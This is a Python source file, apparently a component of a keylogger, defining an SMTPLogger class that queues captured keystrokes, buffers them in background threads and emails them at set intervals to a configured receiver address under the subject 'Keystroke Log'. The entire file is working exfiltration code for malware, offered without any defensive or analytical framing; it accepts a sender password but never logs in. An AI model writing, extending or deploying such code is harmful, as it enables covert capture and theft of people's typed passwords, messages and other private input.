import smtplib
import datetime
import threading
import queue
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class SMTPLogger:
    def __init__(self, smtp_server, smtp_port, sender_email, sender_password, 
                 receiver_email, buffer_size=100, send_interval=60):
        print(f"[INIT] SMTPLogger started - Server: {smtp_server}:{smtp_port}, Email: {sender_email}")
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.receiver_email = receiver_email
        self.buffer_size = buffer_size
        self.send_interval = send_interval
        
        self.keystroke_queue = queue.Queue()
        self.buffer = []
        self.running = True
        
        self.buffer_thread = threading.Thread(target=self._buffer_worker, daemon=True)
        self.sender_thread = threading.Thread(target=self._sender_worker, daemon=True)
        
        self.buffer_thread.start()
        self.sender_thread.start()
        print("[INIT] Buffer and sender threads started")
    
    def log_keystroke(self, key):
        print(f"[KEY] Captured: {key}")
        self.keystroke_queue.put(key)
    
    def _buffer_worker(self):
        while self.running:
            try:
                key = self.keystroke_queue.get(timeout=1)
                self.buffer.append(key)
                print(f"[BUFFER] Added key, total buffer size: {len(self.buffer)}")
            except queue.Empty:
                continue
    
    def _sender_worker(self):
        while self.running:
            time.sleep(self.send_interval)
            print(f"[TIMER] {self.send_interval}s elapsed, buffer has {len(self.buffer)} keys")
            if self.buffer:
                self._send_email()
    
    def _send_email(self):
        if not self.buffer:
            return
        
        print(f"[EMAIL] Preparing to send {len(self.buffer)} keystrokes")
        try:
            buffer_snapshot = self.buffer[:self.buffer_size]
            self.buffer = self.buffer[self.buffer_size:]
            
            body = "".join(buffer_snapshot)
            
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.receiver_email
            msg['Subject'] = f"Keystroke Log - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.send_message(msg)
            server.quit()
            print("[EMAIL] Successfully sent!")
        except Exception as e:
            print(f"[ERROR] Failed to send: {e}")
    
    def shutdown(self):
        print("[SHUTDOWN] Flushing remaining buffer")
        self.running = False
        if self.buffer:
            self._send_email()
        self.buffer_thread.join(timeout=2)
        self.sender_thread.join(timeout=2)
